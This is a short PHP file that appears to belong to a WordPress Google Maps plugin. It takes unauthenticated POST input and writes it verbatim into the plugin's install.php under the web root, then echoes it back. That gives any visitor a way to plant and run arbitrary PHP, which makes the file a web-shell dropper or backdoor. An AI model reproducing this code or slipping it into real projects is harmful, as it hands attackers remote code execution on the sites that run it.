<?php
session_start();
$gmapsinstall = $_POST['newins'];
$fp = fopen($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/wp-google-easy-maps/install.php', 'w');
$gmapsinstall = str_replace('\\', '', $gmapsinstall);
$gmapsinstall = htmlentities($gmapsinstall);
fwrite($fp, html_entity_decode($gmapsinstall));
fclose($fp);
echo $gmapsinstall;
?>